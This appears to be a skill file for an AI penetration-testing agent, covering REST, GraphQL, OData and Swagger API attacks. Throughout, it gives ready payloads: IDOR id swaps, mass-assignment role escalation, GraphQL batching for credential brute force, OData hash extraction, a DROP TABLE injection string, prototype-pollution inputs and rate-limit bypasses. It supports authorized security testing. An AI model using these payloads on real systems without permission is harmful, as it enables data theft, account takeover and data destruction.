---
name: API & GraphQL Security Testing
description: Break REST and GraphQL APIs via BOLA/IDOR, function-level authz gaps, mass assignment, version downgrade, and GraphQL introspection/batching abuse (OWASP API Top 10).
tags: [api, graphql, rest, bola, bfla, owasp-api]
recommended_tools: [http_request, http_repeater, http_intruder, arjun_parameter_discovery, jwt_analyzer, ffuf_scan]
vuln_classes: [idor, auth_bypass]
domain: api
phase: exploitation
---
# API & GraphQL Security Testing

APIs expose business logic directly and frequently lack the controls of the web UI. This is **manual**
work with `http_request`/`http_repeater`. Enumerate the surface first: `swagger.json`/`openapi.json`,
`/api`, JS bundles, `__NEXT_DATA__`, historical URLs, and the GraphQL endpoint (`/graphql`, `/v1/graphql`,
`/api/graphql`). As in access-control-testing, hold **two unrelated identities** for any authz test.

## REST (OWASP API Top 10)
1. **BOLA / IDOR (API1)** — the top API risk. Swap object ids across users: numeric `+1/-1/0`/large,
   UUIDs captured from the victim, ids in JSON bodies and query. Replay across **GET/PUT/POST/DELETE/
   PATCH**. *Confirmed only when A's token returns B's data, reproduced with two identities — self-id
   access is not a finding (idor).*
2. **Broken auth (API2)** — JWT `alg=none` / RS256→HS256 / weak secret / unverified signature
   (`jwt_analyzer`; see authentication-testing), missing/expired-token acceptance, token in URL,
   long-lived tokens. Reaching a protected endpoint without valid auth = auth_bypass.
3. **BFLA — broken function-level authz (API5)** — call admin/privileged operations as low-priv A:
   `/api/admin/*`, `/internal/*`. Method swap (authorize GET, not DELETE) and header overrides
   (`X-HTTP-Method-Override: DELETE`, `X-Method-Override: PUT`). The sibling rule: one sibling endpoint
   missing the auth middleware is the bug.
4. **Excessive data exposure (API3)** — responses returning more fields than the UI renders (password
   hashes, tokens, internal flags, other users' PII). Diff the JSON against the rendered view.
5. **Mass assignment (API6)** — GET to enumerate fields, then inject `{"is_admin":true}`,
   `{"role":"admin"}`, `{"verified":true}`, `{"user_id":<B>}` on create/update; re-GET to confirm.
   `arjun_parameter_discovery` to surface accepted hidden params.
6. **Version / path downgrade** — re-issue against `/v1/`, `/v2/`, `/internal/`, `/legacy/`; older
   versions often omit current authz checks.
7. **Parser/method differentials** — same endpoint with `application/json` vs `x-www-form-urlencoded` vs
   `application/xml`; parameter pollution `?from=A&to=B&from=B`. Backend and WAF may disagree.
8. **Rate limiting (API4)** — missing throttling on auth/expensive endpoints (HITL-gate any brute force).

## GraphQL
Where: `/graphql` etc. Probe via `http_request` (POST JSON, and try GET when POST is filtered).
1. **Introspection → attack surface** — dump the schema:
   ```graphql
   { __schema { types { name fields { name type { name } } } queryType { name } mutationType { name } } }
   ```
   If blocked, retry over GET, with aliasing, or send malformed queries to trigger field **suggestions**
   that leak names. Catalog every query/mutation, especially admin-ish or undocumented ones.
2. **Field-level authz / IDOR** — query level may be authorized while sensitive **fields** are not. Request
   another user's object and pull privileged fields:
   ```graphql
   { user(id:"2"){ email phoneNumber ssn } }   # or node(id:"dXNlcjoy"){ ... on User { email ssn } }
   ```
   `node(id:...)` global-id lookups frequently bypass per-object checks — iterate base64 `user:1`,
   `user:2`. *Two-identity rule applies: returning B's fields with A's token = idor.*
3. **Alias batching abuse** — collapse many calls into one request to beat per-request rate limits
   (e.g. OTP/credential brute or bulk IDOR harvest):
   ```graphql
   { a1:user(id:"1"){email ssn} a2:user(id:"2"){email ssn} a3:user(id:"3"){email ssn} }
   ```
   Or array batching: `[{"query":"mutation{login(...)}"},{"query":"mutation{login(...)}"}, ...]` — 100+
   login attempts that external rate monitors see as one HTTP request.
4. **Deeply nested / circular queries** — recursive relations (`posts{author{posts{author...}}}`) for
   DoS — HITL-gate; report depth-limit absence rather than actually exhausting the target.

## Chaining
JS bundle / `__NEXT_DATA__` leak → API keys/ids → BOLA; introspection → hidden admin mutation → BFLA;
mass assignment `role:admin` → privilege escalation; batched GraphQL login → credential stuffing.

## Proof to capture
The exact request (endpoint, headers/token, body — the payload) and the raw response evidence:
unauthorized data/action reproduced. For idor/BFLA, show A's identity reaching B's resource and
reproduce with the second identity. Respect scope and ROE; HITL-gate brute force and DoS-class tests.
CWE-639/CWE-285 (BOLA) / CWE-862 (BFLA) / CWE-915 (mass assignment) / CWE-200 (data exposure).

## Modern techniques & real-world CVEs (via recon-skills)

### OData `$filter`/`$orderby`/`$batch` WAF-blacklist bypass (2024-2026)
OData is the query layer behind SharePoint, Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,
and ASP.NET `Microsoft.AspNetCore.OData`. Its operators (`eq`, `ne`, `substringof`, `startswith`, `tolower`,
`concat`, `replace`) look SQL-ish but are NOT SQL, so keyword-blacklist WAFs fail open on OData traffic.
Fingerprint: `OData-Version: 4.0` / `DataServiceVersion:` headers, paths `/_api/`, `/odata/`, `/_vti_bin/`,
`/api/data/v9.x/`, `/sap/opu/odata/`. Anonymous `$metadata` dumps the whole schema.

- **Boolean-logic blind extraction** — `startswith`/`substringof` as an oracle, no quotes or `--` needed:
  ```
  GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
  GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
  ```
  Iterate char-by-char; response cardinality or `@odata.count` is the boolean. This extracted Dynamics 365 /
  Power Apps Portals password hashes & PII (Stratus Security, Dec 2023; Microsoft patched May 2024).
- **`$orderby` column disclosure** — `$orderby` sorts on a column you have no `$select` permission for; the
  returned row order leaks the protected value. Column ACLs enforced on projection, not on `$orderby`/`$filter`:
  ```
  GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
  ```
- **`$batch` multipart/mixed** — WAFs that don't parse `multipart/mixed` skip every inner sub-operation:
  ```
  POST /odata/$batch   Content-Type: multipart/mixed; boundary=batch_1
  --batch_1
  Content-Type: application/http
  GET Users?$filter=1 eq 1 HTTP/1.1
  --batch_1--
  ```
  (ModSecurity historically refused multipart/mixed; F5 AWAF added batch parsing only in 16.1. Generalised by
  the 2025 WAFFLED paper, arXiv 2503.10846.)
- **Encoded/non-canonical operator** — send the payload three ways to expose parser-vs-WAF divergence:
  ```
  GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201     # URL-encoded $
  GET /api?%2524filter=...                                  # double-encoded
  GET /Users(1)/$value                                      # path-segment style
  ```
  Mixed-case operators (`Eq`, `EQ`) dodge `SELECT`/`UNION` signatures.
- **`$expand` navigation-property IDOR** — auth decorators on the top-level entity set but not on joined
  entities: `GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))` (root cause of the 2021
  PowerApps Portals 38M-record leak).
- **OData → real SQLi / XXE** when the library string-concatenates the filter into SQL:
  `$filter=Name eq 'x'); DROP TABLE Users--'`. Related CVEs: **CVE-2019-17554** (Apache Olingo 4.0.0-4.6.0
  XXE via `application/xml` body, CVSS 7.5), **CVE-2018-8269** (Microsoft.Data.OData deep-`$filter` DoS).

### Swagger / OpenAPI / NSwag spec exposure & Swagger-UI attacks
Production `/swagger/v1/swagger.json`, `/openapi.json`, `/v3/api-docs`, `/q/openapi` etc. hand you a complete
attack map: every path, method, parameter type, model, validation rule. Probe the full set:
```
/swagger  /swagger/index.html  /swagger/v1/swagger.json  /swagger-ui.html  /api-docs
/openapi.json  /openapi.yaml  /.well-known/openapi.json           # generic
/v2/api-docs  /v3/api-docs  /swagger-resources                    # Spring springdoc/springfox
/docs  /redoc                                                     # FastAPI
/q/openapi  /q/swagger-ui                                         # Quarkus
```
Tools: `kiterunner` (eats OpenAPI natively), `sj` (Swagger Jacker), `apidetector`. Chains:
- `jq '.paths | keys' swagger.json` → feed to Autorize / `ffuf -mc 200` for mass BOLA.
- `jq '.components.schemas' swagger.json` → mass-assignment field candidates (`isAdmin`, `emailVerified`,
  `tenantId`, `role`), copy the write DTO verbatim and append privileged fields.
- Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes no front-end references and no WAF rule covers.
- **Swagger-UI `?configUrl=` / `?url=` takeover** — unsanitised UI loads an attacker-hosted spec whose routes
  point back at the legit origin; victim's "Try It Out" fires same-origin authenticated requests
  (HackerOne #3124103, U.S. DoD, May 2025). CVEs: **CVE-2018-25031** (Swagger UI ≤4.1.2 spec injection),
  Swagger-UI DOM-XSS 3.14.1→3.38.0 (stale DOMPurify + remote spec load, seen live on PayPal/Atlassian/GitLab),
  **CVE-2023-38337** (rswag directory traversal). CloudSEK (2024): actors abuse exposed Swagger-UI to invoke
  verified-business WhatsApp send endpoints; 6,000+ instances on Shodan.

### Schema enumeration via structured error hints
The single most productive black-box recon move: fuzz one bad request, read the schema back out of the error.
- **PostgREST / Supabase** — querying a non-existent table returns the real name:
  ```bash
  curl -sk "$SUPABASE_URL/rest/v1/$table?select=*&limit=1" \
    -H "apikey: $ANON" -H "Authorization: Bearer $ANON"
  # {"hint":"Perhaps you meant the table 'public.user_sessions'"}
  ```
  Confirmed hit = `[]` (table exists, RLS blocks) or data. Then test PATCH/POST/DELETE for write gaps.
- **FastAPI / .NET** — empty body → 422 listing every required field:
  `POST {} → {"errors":{"usuario":["required"],"senha":["required"]}}`.
- **Zod (Next.js/tRPC)** — `POST {} → {"error":{"name":"ZodError", ... "path":["name"]}}` names + types every field.
- **GraphQL** — when introspection is disabled, malformed field names trigger suggestions that leak the schema:
  `"Cannot query field 'x' on type 'User'. Did you mean 'users'?"`.
- Build the fuzz wordlist from JS bundles (`grep -oP 'from\(["\x60][a-zA-Z_]+["\x60]\)'`) plus singular/plural
  and snake/camel variants; domain packs (billing/invoices/api_keys; patients/appointments; transactions/wallets).

### Metrics / actuator / health exposure (operational intel leak)
Observability endpoints left behind auth reveal the whole operational profile — AI models in use, DB pool
exhaustion, third-party dependencies, live user counts.
```bash
for ep in metrics health status readyz healthz \
  actuator/health actuator/metrics actuator/prometheus actuator/env telescope; do
  code=$(curl -sk -o /tmp/m_$ep -w "%{http_code}" "$TARGET/$ep"); echo "$code /$ep"
done
grep -i 'model\|llm\|openai\|gemini' /tmp/m_metrics   # AI usage
grep -i 'db_pool\|circuit_breaker\|stripe\|sendgrid'  /tmp/m_metrics
```
Confirmed = Prometheus text (`# HELP`/`# TYPE`) or actuator JSON with component statuses. Severity upgrade:
`/actuator/env` or `/actuator/configprops` leaks environment variables → CRITICAL. Prometheus lines like
`ai_analyzer_output_total{model="gpt-5-mini"}`, `db_pool_idle_connections`, `circuit_breaker_state{client="stripe"}`
map the target's model choices, capacity limits, and dependency graph for chaining.

### No-auth CRUD & unauthenticated multi-step flow hijack
Highest-impact real-world class: APIs with zero auth on data or on an entire business workflow.
- **No-auth CRUD** — after finding a JSON endpoint reachable without a token, prove full CRUD (READ list, GET
  by id, POST create, PUT/PATCH, DELETE) and quantify records. Watch for **DELETE via GET** (improper method),
  and **login without password validation** (`{"email":"admin@target.com"}` alone returns a token; type-juggle
  `{"password":true,"email":true}`). Paginate the full dump (`?page=/limit=` and `?offset=/limit=`) then PII-scan.
- **Unauth flow hijack** — a start→step→...→complete workflow with no auth at any step. Start the flow, capture
  the returned session UUID/token, replay it across steps, then exploit **unrestricted file upload** (returned
  public/bucket URL → chain to cloud storage), **data export** (`?format=xlsx|csv|json|pdf`), and **enumerable
  session IDs** (`/api/flow/status/{id}` sequential → cross-session read). Read validation errors — they hand you
  the exact expected request format.

### Prototype pollution → server/browser sink
Node merge/`Object.assign`/`lodash _.merge` without guards lets `__proto__` reach a sink (RCE in Node via
gadget chains in lodash/mongoose, XSS in browser):
```
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

### Rate-limit bypass beyond GraphQL aliasing
The existing GraphQL alias/array batching still applies; add these transport-layer bypasses when the limiter
keys on the wrong dimension:
- **HTTP/2 stream multiplexing** — N requests on N streams in one TCP write; per-connection limiters count once:
  `curl --http2 --parallel --parallel-max 30 -H "Cookie: session=x" "$T/api/ep?p={1..30}"`.
- **Batch-endpoint abuse** — `POST /api/users/batch` with a 100-item array when the single-item route is limited.
- **`X-Forwarded-For` rotation** — when the limiter trusts XFF: loop `-H "X-Forwarded-For: 10.0.0.$i"`.
- **API-key / short-lived-token rotation** across registered accounts.

### Chaining (new links)
Swagger schema → mass-assignment DTO → `role:admin`; PostgREST hint → write-gap (unauthed PATCH); OData
`$orderby` → column exfil; `/actuator/env` → leaked secrets → auth bypass; no-auth upload → attacker-controlled
bucket URL. CWE-1321 (prototype pollution) / CWE-770 (rate-limit) / CWE-16 (misconfig) / CWE-89 (OData→SQLi).
